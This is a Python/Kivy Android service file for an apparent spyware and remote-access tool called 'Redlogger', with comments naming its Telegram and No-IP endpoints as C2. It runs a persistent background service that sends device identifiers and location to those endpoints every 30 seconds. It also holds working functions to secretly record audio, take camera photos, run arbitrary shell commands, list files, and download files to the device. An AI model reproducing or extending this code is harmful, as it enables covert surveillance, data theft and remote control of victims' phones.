from kivy.utils import platform

if platform == 'android':
    from jnius import autoclass, cast, PythonJavaClass, java_method
    from android.permissions import request_permissions, Permission
    from kivy.app import App
    from kivy.clock import Clock
    from kivy.utils import get_resource_path
    import os
    import time
    import subprocess
    import requests
    import json

    # C2 Configuration (same as in main.py)
    TELEGRAM_BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN', 'YOUR_TELEGRAM_BOT_TOKEN')
    TELEGRAM_CHAT_ID = os.environ.get('TELEGRAM_CHAT_ID', 'YOUR_TELEGRAM_CHAT_ID')
    NOIP_URL = os.environ.get('NOIP_URL', 'YOUR_NOIP_URL')

    # Android specific imports
    Context = autoclass('android.content.Context')
    Intent = autoclass('android.content.Intent')
    PendingIntent = autoclass('android.app.PendingIntent')
    Notification = autoclass('android.app.Notification')
    NotificationChannel = autoclass('android.app.NotificationChannel')
    NotificationManager = autoclass('android.app.NotificationChannel')
    Uri = autoclass('android.net.Uri')
    File = autoclass('java.io.File')
    Environment = autoclass('android.os.Environment')
    MediaRecorder = autoclass('android.media.MediaRecorder')
    AudioSource = autoclass('android.media.MediaRecorder$AudioSource')
    OutputFormat = autoclass('android.media.MediaRecorder$OutputFormat')
    AudioEncoder = autoclass('android.media.MediaRecorder$AudioEncoder')
    Camera = autoclass('android.hardware.Camera')
    SurfaceTexture = autoclass('android.graphics.SurfaceTexture')
    FileOutputStream = autoclass('java.io.FileOutputStream')
    UUID = autoclass('java.util.UUID')

    # For boot start
    BroadcastReceiver = autoclass('android.content.BroadcastReceiver')

    class ServiceRedloggerService(PythonJavaClass):
        __javainterfaces__ = ['org.kivy.android.PythonService']
        __javaclass__ = 'org.redlogger.redlogger.ServiceRedloggerService'

        def __init__(self):
            super().__init__()
            self.running = False
            self.notification_id = 1
            self.notification_channel_id = "redlogger_channel"
            self.notification_channel_name = "Redlogger Background Service"
            self.notification_manager = cast(NotificationManager, App.get_running_app()._get_context().getSystemService(Context.NOTIFICATION_SERVICE))

        @java_method('(Landroid/content/Context;Ljava/lang/String;)V')
        def onCreate(self, context, service_name):
            self.context = context
            self.setup_notification()
            self.running = True
            Clock.schedule_interval(self.do_work, 30) # Run every 30 seconds
            print("Redlogger service created!")

        @java_method('()V')
        def onDestroy(self):
            self.running = False
            Clock.unschedule(self.do_work)
            print("Redlogger service destroyed!")

        def setup_notification(self):
            if hasattr(NotificationChannel, 'IMPORTANCE_LOW'):
                channel = NotificationChannel(self.notification_channel_id, self.notification_channel_name, NotificationManager.IMPORTANCE_LOW)
                self.notification_manager.createNotificationChannel(channel)

            notification_builder = Notification.Builder(self.context, self.notification_channel_id)
            notification_builder.setContentTitle("Redlogger")
            notification_builder.setContentText("Running in background...")
            # Assuming you have an icon named 'icon.png' in your app's res/drawable folder
            # You might need to adjust this based on how Buildozer packages resources
            # For simplicity, let's use a generic icon if available or skip for now.
            # notification_builder.setSmallIcon(self.context.getApplicationInfo().icon)
            notification_builder.setOngoing(True)

            service_instance = autoclass('org.redlogger.redlogger.ServiceRedloggerService').mService
            service_instance.startForeground(self.notification_id, notification_builder.build())

        def do_work(self, dt):
            print("Redlogger service doing work...")
            # Example: collect data and send it
            data = self.collect_data()
            self.send_to_telegram(data)
            self.send_to_noip(data)

        def collect_data(self):
            # Placeholder for data collection
            data = {
                'imei': 'N/A',
                'android_version': 'N/A',
                'battery': 'N/A',
                'location': 'N/A',
                'user': 'N/A',
                'device': 'N/A',
            }
            return data

        def send_to_telegram(self, data):
            if TELEGRAM_BOT_TOKEN != 'YOUR_TELEGRAM_BOT_TOKEN':
                message = """
                **Redlogger Data**
                IMEI: {imei}
                Android Version: {android_version}
                Battery: {battery}
                Location: {location}
                User: {user}
                Device: {device}
                """.format(**data)
                url = f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage'
                payload = {'chat_id': TELEGRAM_CHAT_ID, 'text': message, 'parse_mode': 'Markdown'}
                try:
                    requests.post(url, json=payload)
                except Exception as e:
                    print(f'Error sending to Telegram: {e}')

        def send_to_noip(self, data):
            if NOIP_URL != 'YOUR_NOIP_URL':
                try:
                    requests.post(NOIP_URL, json=data)
                except Exception as e:
                    print(f'Error sending to No-IP: {e}')

        def record_audio(self, duration=5):
            output_file = os.path.join(Environment.getExternalStorageDirectory().getAbsolutePath(), f'redlogger_audio_{UUID.randomUUID()}.3gp')
            recorder = MediaRecorder()
            recorder.setAudioSource(AudioSource.MIC)
            recorder.setOutputFormat(OutputFormat.THREE_GPP)
            recorder.setAudioEncoder(AudioEncoder.AMR_NB)
            recorder.setOutputFile(output_file)
            try:
                recorder.prepare()
                recorder.start()
                Clock.schedule_once(lambda dt: recorder.stop(), duration)
                Clock.schedule_once(lambda dt: recorder.release(), duration + 1)
                return f"Audio recording started to {output_file}"
            except Exception as e:
                return f"Error recording audio: {e}"

        def take_picture(self):
            output_file = os.path.join(Environment.getExternalStorageDirectory().getAbsolutePath(), f'redlogger_photo_{UUID.randomUUID()}.jpg')
            try:
                camera = Camera.open()
                camera.setPreviewTexture(SurfaceTexture(0)) # Dummy surface texture
                camera.startPreview()
                camera.takePicture(None, None, PictureCallback(output_file))
                camera.stopPreview()
                camera.release()
                return f"Picture taken and saved to {output_file}"
            except Exception as e:
                return f"Error taking picture: {e}"

        def execute_shell_command(self, command):
            try:
                result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
                return result.decode("utf-8")
            except Exception as e:
                return f"Error executing command: {e}"

        def list_files(self, path):
            try:
                files = os.listdir(path)
                return "\n".join(files)
            except Exception as e:
                return f"Error listing files: {e}"

        def upload_file(self, file_path):
            if not os.path.exists(file_path):
                return f"File not found: {file_path}"
            try:
                with open(file_path, 'rb') as f:
                    files = {'file': f}
                    # This needs to be sent to the controller, either Telegram or No-IP
                    # For Telegram, you'd use sendDocument API
                    # For No-IP, you'd POST the file data
                    # Placeholder for now
                    print(f"Attempting to upload {file_path}")
                    return f"File upload initiated for {file_path}"
            except Exception as e:
                return f"Error uploading file: {e}"

        def download_file(self, url, destination_path):
            try:
                response = requests.get(url, stream=True)
                response.raise_for_status()
                with open(destination_path, 'wb') as f:
                    for chunk in response.iter_content(chunk_size=8192):
                        f.write(chunk)
                return f"File downloaded to {destination_path}"
            except Exception as e:
                return f"Error downloading file: {e}"

    class PictureCallback(PythonJavaClass):
        __javainterfaces__ = ['android.hardware.Camera$PictureCallback']

        def __init__(self, output_file):
            super().__init__()
            self.output_file = output_file

        @java_method('([BLandroid/hardware/Camera;)V')
        def onPictureTaken(self, data, camera):
            try:
                fos = FileOutputStream(File(self.output_file))
                fos.write(data)
                fos.close()
                print(f"Picture saved to {self.output_file}")
            except Exception as e:
                print(f"Error saving picture: {e}")

    # This is the entry point for the service
    def start_service():
        ServiceRedloggerService()

    # This is needed for the service to run
    if __name__ == '__main__':
        start_service()
        # Keep the service alive
        while True:
            time.sleep(1)



